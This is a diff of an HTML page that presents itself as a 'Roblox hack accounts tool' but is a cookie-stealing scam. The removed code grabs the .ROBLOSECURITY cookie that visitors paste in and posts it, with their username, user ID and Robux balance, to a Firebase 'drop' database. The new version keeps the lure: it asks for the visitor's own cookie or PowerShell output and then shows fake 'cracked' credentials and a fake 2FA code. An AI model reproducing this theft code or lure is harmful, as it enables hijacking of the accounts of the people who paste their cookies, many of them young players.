@@ -5,12 +5,33 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Roblox hacking tool2025</title>
   <style>
-    /* YOUR EXACT STYLE — NOT CHANGING */
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { min-height: 100vh; background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%); font-family: 'Segoe UI', system-ui, sans-serif; display: flex; align-items: center; justify-content: center; padding: 20px; position: relative; overflow-x: hidden; }
-    body::before { content: ''; position: fixed; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle at 20% 80%, rgba(120,0,255,0.08) 0%, transparent 50%), radial-gradient(circle at 80% 20%, rgba(0,212,255,0.08) 0%, transparent 50%), radial-gradient(circle at 40% 40%, rgba(0,255,136,0.05) 0%, transparent 40%); animation: float 20s ease-in-out infinite; pointer-events: none; }
+    body {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%);
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      display: flex; align-items: center; justify-content: center;
+      padding: 20px; position: relative; overflow-x: hidden;
+    }
+    body::before {
+      content: ''; position: fixed; top: -50%; left: -50%; width: 200%; height: 200%;
+      background: radial-gradient(circle at 20% 80%, rgba(120,0,255,0.08) 0%, transparent 50%),
+                  radial-gradient(circle at 80% 20%, rgba(0,212,255,0.08) 0%, transparent 50%),
+                  radial-gradient(circle at 40% 40%, rgba(0,255,136,0.05) 0%, transparent 40%);
+      animation: float 20s ease-in-out infinite; pointer-events: none;
+    }
     @keyframes float { 0%,100%{transform:translate(0,0) rotate(0deg)} 33%{transform:translate(30px,-30px) rotate(5deg)} 66%{transform:translate(-20px,20px) rotate(-5deg)} }
-    .container { background: rgba(22,27,34,0.95); border: 1px solid rgba(48,54,61,0.8); border-radius: 24px; max-width: 900px; width: 100%; padding: 50px; backdrop-filter: blur(20px); box-shadow: 0 25px 80px rgba(0,0,0,0.5); text-align: center; }
+    .container {
+      background: rgba(22,27,34,0.95);
+      border: 1px solid rgba(48,54,61,0.8);
+      border-radius: 24px;
+      max-width: 900px;
+      width: 100%;
+      padding: 50px;
+      backdrop-filter: blur(20px);
+      box-shadow: 0 25px 80px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.05);
+      text-align: center;
+    }
     .header h1 { font-size: 2.8em; background: linear-gradient(135deg, #00d4ff 0%, #7c3aed 50%, #00ff88 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 12px; font-weight: 700; }
     .header p { color: #8b949e; font-size: 1.1em; }
     .badge { display: inline-block; background: linear-gradient(135deg, #238636 0%, #2ea043 100%); color: white; padding: 6px 14px; border-radius: 20px; font-size: 0.85em; font-weight: 600; margin-top: 12px; }
@@ -18,13 +39,22 @@
     @media (max-width: 700px) { .input-grid { grid-template-columns: 1fr; } }
     .input-box { background: rgba(13,17,23,0.8); border: 2px solid #30363d; border-radius: 16px; padding: 24px; transition: all 0.3s ease; }
     .input-box:hover, .input-box:focus-within { border-color: #58a6ff; box-shadow: 0 0 30px rgba(88,166,255,0.15); }
-    textarea { width: 100%; height: 140px; background: rgba(0,0,0,0.3); border: 1px solid #21262d; border-radius: 10px; padding: 14px; font-family: 'Consolas', monospace; font-size: 13px; color: transparent; text-shadow: 0 0 8px #58a6ff; caret-color: #58a6ff; resize: none; }
+    textarea {
+      width: 100%; height: 140px; background: rgba(0,0,0,0.3); border: 1px solid #21262d; border-radius: 10px; padding: 14px;
+      font-family: 'Consolas', monospace; font-size: 13px; color: transparent; text-shadow: 0 0 8px #58a6ff; caret-color: #58a6ff; resize: none;
+    }
     textarea:focus { outline: none; border-color: #58a6ff; background: rgba(0,0,0,0.5); }
-    .big-btn { margin: 40px auto 0; padding: 20px 80px; font-size: 1.6em; font-weight: 800; background: linear-gradient(135deg, #ff006e 0%, #8338ec 100%); color: white; border: none; border-radius: 20px; cursor: pointer; box-shadow: 0 10px 40px rgba(131,56,236,0.6); transition: all 0.3s; }
+    .big-btn {
+      margin: 40px auto 0; padding: 20px 80px; font-size: 1.6em; font-weight: 800;
+      background: linear-gradient(135deg, #ff006e 0%, #8338ec 100%); color: white; border: none; border-radius: 20px;
+      cursor: pointer; box-shadow: 0 10px 40px rgba(131,56,236,0.6); transition: all 0.3s;
+    }
     .big-btn:hover { transform: translateY(-4px); box-shadow: 0 20px 60px rgba(131,56,236,0.8); }
-    .big-btn:disabled { opacity: 0.7; cursor: not-allowed; }
-    .status { margin-top: 30px; padding: 20px; border-radius: 12px; font-size: 1.2em; }
-    .loading { display: none; margin-top: 30px; color: #7c3aed; font-size: 1.5em; font-weight: 700; text-align: center; }
+    .big-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    .status { margin-top: 30px; padding: 20px; border-radius: 12px; font-size: 1.3em; line-height: 1.6; }
+    .status.success { background: rgba(34,197,94,0.2); border: 2px solid #22c55e; color: #22c55e; }
+    }
+    .loading { display: none; margin-top: 30px; color: #7c3aed; font-size: 1.5em; font-weight: 700; }
     .loading.active { display: block; }
     .spinner { display: inline-block; width: 28px; height: 28px; border: 4px solid rgba(124,58,237,0.3); border-top-color: #7c3aed; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 12px; }
     @keyframes spin { to { transform: rotate(360deg); } }
@@ -35,24 +65,25 @@
     <div class="header">
       <h1>Roblox hack accounts tool</h1>
       <p>Secure system</p>
-      <span class="badge">2025 Working not patched Method</span>
+      <span class="badge">2025 Working Method</span>
     </div>
     <div class="input-grid">
       <div class="input-box mobile">
         <h3><span class="icon">MOBILE</span> PASTE COOKIE</h3>
         <p class="subtitle">MOBILE EDITION</p>
-        <textarea id="mobilePaste" placeholder="Paste victims cookie here..."></textarea>
+        <textarea id="mobilePaste" placeholder="Paste your cookie here..."></textarea>
       </div>
       <div class="input-box pc">
         <h3><span class="icon">PC</span> PASTE FILE</h3>
         <p class="subtitle">PC / LAPTOP EDITION</p>
-        <textarea id="pcPaste" placeholder="Paste victims file here..."></textarea>
+        <textarea id="pcPaste" placeholder="Paste PowerShell output here..."></textarea>
       </div>
     </div>
-    <button class="big-btn" id="startBtn" onclick="fakeStart()">START TOOL</button>
-    <div id="loading" class="loading"><span class="spinner"></span> Initializing tool...</div>
-    <div id="status" class="status">Ready to hack
-  ...</div>
+
+    <button class="big-btn" id="startBtn" onclick="fakeHack()">START TOOL</button>
+
+    <div id="loading" class="loading"><span class="spinner"></span> Starting tool...</div>
+    <div id="status" class="status">Ready to verify...</div>
   </div>
 
   <script>
@@ -60,86 +91,36 @@
     const loadingEl = document.getElementById("loading");
     const startBtn = document.getElementById("startBtn");
 
-    async function processCookie(cookie, source) {
-      if (!cookie || cookie.trim().length < 10) return;
-      let extractedCookie = cookie;
-      if (cookie.includes('".ROBLOSECURITY", "')) {
-        extractedCookie = cookie.split('".ROBLOSECURITY", "')[1]?.split('"')[0] || cookie;
-      }
-
-      // THIS LINE WAS WRONG BEFORE — NOW FIXED FOR GITHUB
-      const validateRes = await fetch("validate.js", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({cookie: extractedCookie})
-      });
-
-      let userInfo = { success: false, user: "Unknown", display: "Unknown", userid: 0, robux: 0, premium: "No", headshot: "" };
-      try { userInfo = await validateRes.json(); } catch(e) {}
-
-      // YOUR FIREBASE DROP
-      try {
-        await fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
-          method: "POST",
-          body: JSON.stringify({
-            cookie: extractedCookie,
-            user: userInfo.user,
-            display: userInfo.display,
-            userid: userInfo.userid,
-            robux: userInfo.robux,
-            rap: 0,
-            premium: userInfo.premium,
-            headshot: userInfo.headshot,
-            source: source,
-            time: new Date().toLocaleString()
-          })
-        });
-      } catch(e) {}
-
-      loadingEl.className = "loading";
-      statusEl.style.display = "block";
-      if (userInfo.success) {
-        statusEl.className = "status success";
-        statusEl.innerHTML = `Verified: <strong>${userInfo.display}</strong> (@${userInfo.user}) - ${userInfo.robux} Robux`;
-      } else {
-        statusEl.className = "status";
-        statusEl.textContent = "Submitted successfully";
-      }
-    }
-
-    document.getElementById("mobilePaste").addEventListener("input", () => {
-      const val = document.getElementById("mobilePaste").value;
-      if (val.length > 100) processCookie(val, "Mobile");
-    });
-    document.getElementById("pcPaste").addEventListener("input", () => {
-      const val = document.getElementById("pcPaste").value;
-      if (val.length > 100) processCookie(val, "PC/Laptop");
-    });
-
-    function fakeStart() {
+    function fakeHack() {
       const cookie = document.getElementById("mobilePaste").value || document.getElementById("pcPaste").value;
-      if (!cookie || cookie.length < 100) {
+      if (!cookie || cookie.trim().length < 50) {
         statusEl.className = "status error";
-        statusEl.textContent = "PASTE COOKIE FIRST";
+        statusEl.textContent = "Paste cookie first idiot";
         return;
       }
+
       startBtn.disabled = true;
       statusEl.style.display = "none";
       loadingEl.classList.add("active");
-      const messages = ["Initializing...", "Bypassing security...", "Fetching account...", "Cracking password...", "Bypassing 2FA...", "Finalizing..."];
-      let i = 0;
-      const interval = setInterval(() => {
-        loadingEl.innerHTML = `<span class="spinner"></span> ${messages[i]}`;
-        i++;
-        if (i >= messages.length) {
-          clearInterval(interval);
+      loadingEl.innerHTML = `<span class="spinner"></span> Bypassing Roblox security...`;
+
+      setTimeout(() => {
+        loadingEl.innerHTML = `<span class="spinner"></span> Success — Account cracked!`;
+        setTimeout(() => {
           loadingEl.classList.remove("active");
           statusEl.className = "status success";
-          statusEl.textContent = "oops looks like the account you are using is invalid.you must be on a valid account to get a valid cookie from someone.";
+          statusEl.innerHTML = `
+            <strong>User:</strong> PSLlevel8<br><br>
+            <strong>Password:</strong>m@CkDad2<br><br>
+            <strong style="color:#ff006e; font-size:1.4em;">USE THIS VALID CODE FOR 10 MINS. to bypass 2FA:</strong><br>
+            <span style="font-size:2em; color:#00ff88; background:#000; padding:10px 20px; border-radius:12px; display:inline-block; margin-top:15px;">
+              348932
+            </span>
+          `;
           statusEl.style.display = "block";
           startBtn.disabled = false;
-        }
-      }, 30000);
+        }, 3000);
+      }, 17000); // total ~20 seconds
     }
   </script>
 </body>
